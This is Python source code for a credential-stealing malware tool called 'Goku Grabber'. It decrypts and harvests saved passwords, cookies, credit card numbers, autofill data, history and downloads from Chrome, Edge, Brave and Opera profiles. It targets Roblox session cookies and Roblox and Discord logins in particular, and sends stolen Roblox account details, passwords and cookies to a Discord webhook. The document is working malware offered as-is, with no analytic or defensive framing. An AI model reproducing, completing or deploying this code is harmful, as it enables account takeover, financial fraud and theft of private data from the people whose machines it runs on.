class CookieInfo():
    # adding more soon
    def __init__(self, RoCookies):
        for i in RoCookies:
            self.RobloxInfo(i)

    def RobloxInfo(self, cookie: str):
        try:
            r=requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY": cookie}).json()
            webhook = DiscordWebhook(url=wbh, username="Goku Grabber", avatar_url=r"https://cdn.discordapp.com/attachments/1082654131833016411/1092464539045466150/Ultra-Instinct-Parfait-Goku.jpg")
            embed = DiscordEmbed(title=f"Roblox Cookie", description=f"Found Roblox Cookie", color='4300d1')
            embed.set_author(name="author : Goku", icon_url=r'https://cdn.discordapp.com/attachments/1082654131833016411/1092464539045466150/Ultra-Instinct-Parfait-Goku.jpg')
            embed.set_footer(text='Goku Grabber | by : Goku')
            embed.set_timestamp()
            PASSWORD = "Not Found"
            for i in ropasswords:
                if str(r['UserName']).lower() == i.split("|")[0].strip().lower():
                    PASSWORD = i.split("|")[1].strip()
            embed.add_embed_field(name=f"Account of {r['UserName']}\n", value=f":id: ID: ``{r['UserID']}``\n:dollar: Robux Balance: ``{r['RobuxBalance']}``\n:crown: Premium: ``{r['IsPremium']}``\n\n:lock: Roblox Password: ``{PASSWORD}``\n\n:cookie: Roblox Cookie: ``{cookie}``\n")
            embed.set_thumbnail(url=r['ThumbnailUrl'])
            webhook.add_embed(embed)
            webhook.execute()
        except:pass

class Browsers():

    def __init__(self):
        self.amountcookies = 0
        self.amountpasswords = 0
        self.amounthistory = 0
        self.amountdownloads = 0
        self.amountccs = 0
        self.amountautofill = 0
        self.Passwords = "-"
        self.History = "-"
        self.Downloads = "-"
        self.CCs = "-"
        self.Autofill = "-"
        os.mkdir(os.path.join(P4THF0LDR, "Browsers"))
        self.BROWSERPATHFOLDER = os.path.join(P4THF0LDR, "Browsers")
        os.mkdir(os.path.join(self.BROWSERPATHFOLDER, "Importable_Cookies"))
        self.COOKIESPATHFOLDER = os.path.join(self.BROWSERPATHFOLDER, "Importable_Cookies")
        paths = [f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft","Edge","User Data")}', f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google","Chrome","User Data")}',f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware","Brave-Browser","User Data")}',f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software","Opera Stable")}',f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software","Opera GX Stable")}']
        self.prof = ["Default", "Profile 1","Profile 2", "Profile 3", "Profile 4","Profile 5", "Profile 6", "Profile 7", "Profile 8", "Profile 9", "Profile 10"]
        for i in paths:
            if os.path.exists(i):
                try:
                    key = self._key(os.path.join(i, "Local State"))
                    self.cookies(i, key)
                    self.passwords(i, key)
                    self.history(i)
                    self.downloads(i)
                    self.ccs(i, key)
                    self.autofill(i)
                except:
                    pass
                
    def _key(self,path):
        return CryptUnprotectData(base64.b64decode(loads(open(path,'r',encoding='utf-8').read())["os_crypt"]["encrypted_key"])[5:], None, None, None, 0)[1]
    
    def _decrypt(self,b,key):
        c = AES.new(key, AES.MODE_GCM, b[3:15])
        dec = c.decrypt(b[15:])[:-16].decode()
        return dec
    
    def cookies(self,p,key):
        T=0
        for i in self.prof:
            try:
                if "Opera" in p:
                    new_path = os.path.join(p, "Network", "Cookies")
                    if "Opera Stable" in p:
                        writefilepath = self.COOKIESPATHFOLDER+"\\Opera_Cookies.json"
                        f = open(writefilepath,"w+")
                    if "Opera GX Stable" in p:
                        writefilepath = self.COOKIESPATHFOLDER+"\\OperaGX_Cookies.json"
                        f = open(writefilepath,"w+")
                    T+=1
                else:
                    if "Chrome" in p:
                        proft = i.replace(" ","")
                        writefilepath = self.COOKIESPATHFOLDER+f"\\Chrome_Cookies_{proft}.json"
                        f = open(writefilepath,"w+")
                    if "Edge" in p:
                        proft = i.replace(" ","")
                        writefilepath = self.COOKIESPATHFOLDER+f"\\Edge_Cookies_{proft}.json"
                        f = open(writefilepath,"w+")
                    if "Brave-Browser" in p:
                        proft = i.replace(" ","")
                        writefilepath = self.COOKIESPATHFOLDER+f"\\Brave_Cookies_{proft}.json"
                        f = open(writefilepath,"w+")
                    new_path = os.path.join(p, i, "Network", "Cookies")
                if T >1 :
                    pass
                else:
                    shutil.copy(new_path, os.path.join(os.environ["USERPROFILE"], "AppData",f"Cookies"))
                    path2 = os.path.join(os.environ["USERPROFILE"], "AppData",f"Cookies")
                    if os.path.exists(path2):
                        con = connect(path2)
                        cursor = con.cursor()
                        cookies = []
                        for row in cursor.execute("SELECT * FROM cookies").fetchall():
                            dec_value = self._decrypt(row[5],key)
                            if str(row[3]) == ".ROBLOSECURITY":
                                if dec_value not in rocookies:
                                    rocookies.append(dec_value)
                            if str(row[14]) == "-1":R="unspecified"
                            elif str(row[14]) == "1":R="lax"
                            else:R="no_restriction"
                            cookie = {}
                            cookie["domain"] = row[1]
                            if row[7] != 0:
                                cookie["expirationDate"] = (row[7] - 11644473600000000) / 1000000
                            cookie["hostOnly"] = not "." in row[1]
                            cookie["httpOnly"] = bool(row[9])
                            cookie["name"] = row[3]
                            cookie["path"] = row[6]
                            cookie["sameSite"] = R
                            cookie["secure"] = bool(row[8])
                            cookie["session"] = row[11] == 0
                            cookie["storeId"] = "0"
                            cookie["value"] = dec_value
                            cookies.append(cookie)
                            self.amountcookies += 1
                        cursor.close()
                        con.close()
                        json.dump(cookies, f)
            except:pass
    def passwords(self,p,key):
        T=0
        f = open(self.BROWSERPATHFOLDER+"\\Passwords.txt","wb")
        for i in self.prof:
            try:
                if "Opera" in p:
                    new_path = os.path.join(p, "Login Data")
                    T+=1
                else:
                    new_path = os.path.join(p, i, "Login Data")
                if T >1 :
                    pass
                else:
                    shutil.copy(new_path, os.path.join(os.environ["USERPROFILE"], "AppData"))
                    path2 = os.path.join(os.environ["USERPROFILE"], "AppData", "Login Data")
                    if os.path.exists(path2):
                        con = connect(path2)
                        cursor = con.cursor()
                        for V in cursor.execute("SELECT origin_url, username_value, password_value FROM logins").fetchall():
                            url, name, password = V
                            dec = self._decrypt(password,key)
                            if 'roblox' in url:
                                ropasswords.append(f"{name}|{dec}")
                            if 'discord' in url:
                                dispasswords.append(f"{name}|{dec}")
                            self.Passwords += "="*50+f"\nURL : {url}\nName : {name}\nPassword : {dec}\n"
                            self.amountpasswords += 1
                    cursor.close()
                    con.close()
            except:pass
        f.write(self.Passwords.encode())
        f.close()

    def history(self,p):
        T=0
        f = open(self.BROWSERPATHFOLDER+"\\History.txt","wb")
        for i in self.prof:
            try:
                if "Opera" in p:
                    new_path = os.path.join(p, "History")
                    T+=1
                else:
                    new_path = os.path.join(p, i, "History")
                if T >1 :
                    pass
                else:
                    shutil.copy(new_path, os.path.join(os.environ["USERPROFILE"], "AppData"))
                    path2 = os.path.join(os.environ["USERPROFILE"], "AppData", "History")
                    if os.path.exists(path2):
                        con = connect(path2)
                        cursor = con.cursor()
                        for V in cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls").fetchall():
                            url, title, count, last_visit = V
                            if url and title and count and last_visit != "":
                                if len(self.History) < 100000:
                                    self.History += "="*50+f"\nURL : {url}\nTitle : {title}\nVisit Count : {count}\n"
                                    self.amounthistory += 1
                            else:break
                    cursor.close()
                    con.close()
            except:pass
        f.write(self.History.encode())
        f.close()

    def downloads(self,p):
        T=0
        f = open(self.BROWSERPATHFOLDER+"\\Downloads.txt","wb")
        for i in self.prof:
            try:
                if "Opera" in p:
                    new_path = os.path.join(p, "History")
                    T+=1
                else:
                    new_path = os.path.join(p, i, "History")
                if T >1 :
                    pass
                else:
                    shutil.copy(new_path, os.path.join(os.environ["USERPROFILE"], "AppData", "History2"))
                    path2 = os.path.join(os.environ["USERPROFILE"], "AppData", "History2")
                    if os.path.exists(path2):
                        con = connect(path2)
                        cursor = con.cursor()
                        for V in cursor.execute("SELECT tab_url, target_path FROM downloads").fetchall():
                            url, path = V
                            self.Downloads += "="*50+f"\nURL : {url}\nPath : {path}\n"
                            self.amountdownloads += 1
                    cursor.close()
                    con.close()
            except:pass
        f.write(self.Downloads.encode())
        f.close()
    
    def autofill(self,p):
        T=0
        f = open(self.BROWSERPATHFOLDER+"\\Autofill.txt","wb")
        for i in self.prof:
            try:
                if "Opera" in p:
                    new_path = os.path.join(p, "Web Data")
                    T+=1
                else:
                    new_path = os.path.join(p, i, "Web Data")
                if T >1 :
                    pass
                else:
                    shutil.copy(new_path, os.path.join(os.environ["USERPROFILE"], "AppData", "Web Data"))
                    path2 = os.path.join(os.environ["USERPROFILE"], "AppData", "Web Data")
                    if os.path.exists(path2):
                        con = connect(path2)
                        cursor = con.cursor()
                        for V in cursor.execute("SELECT name, value FROM autofill").fetchall():
                            name, value = V
                            self.Autofill += "="*50+f"\nName : {name}\nValue : {value}\n"
                            self.amountautofill += 1
                    cursor.close()
                    con.close()
            except:pass
        f.write(self.Autofill.encode())
        f.close()

    def ccs(self,p,key):
        T=0
        f = open(self.BROWSERPATHFOLDER+"\\CreditCards.txt","wb")
        for i in self.prof:
            try:
                if "Opera" in p:
                    new_path = os.path.join(p, "Web Data")
                    T+=1
                else:
                    new_path = os.path.join(p, i, "Web Data")
                if T >1 :
                    pass
                else:
                    shutil.copy(new_path, os.path.join(os.environ["USERPROFILE"], "AppData", "Web Data"))
                    path2 = os.path.join(os.environ["USERPROFILE"], "AppData", "Web Data")
                    if os.path.exists(path2):
                        con = connect(path2)
                        cursor = con.cursor()
                        for V in cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards").fetchall():
                            name, exp_month, exp_year, cne = V
                            cn = self._decrypt(cne,key)
                            self.CCs += "="*50+f"\nName : {name}\nExpiration Month : {exp_month}\nExpiration Year : {exp_year}\nCard Number : {cn}\n"
                            self.amountccs += 1
                    cursor.close()
                    con.close()
            except:pass
        f.write(self.CCs.encode())
        f.close()
    
    def __repr__(self):
        return f"""
``|_`` :open_file_folder: ``Browsers``
``|   |_``:open_file_folder: ``Importable_Cookies``
``|   |   |_``:page_facing_up: ``({self.amountcookies}) Cookies``
``|   |_``:page_facing_up: ``({self.amountpasswords}) Passwords``
``|   |_``:page_facing_up: ``({self.amounthistory}) History``
``|   |_``:page_facing_up: ``({self.amountdownloads}) Downloads``
``|   |_``:page_facing_up: ``({self.amountccs}) CreditCards``
``|   |_``:page_facing_up: ``({self.amountautofill}) Autofills``"""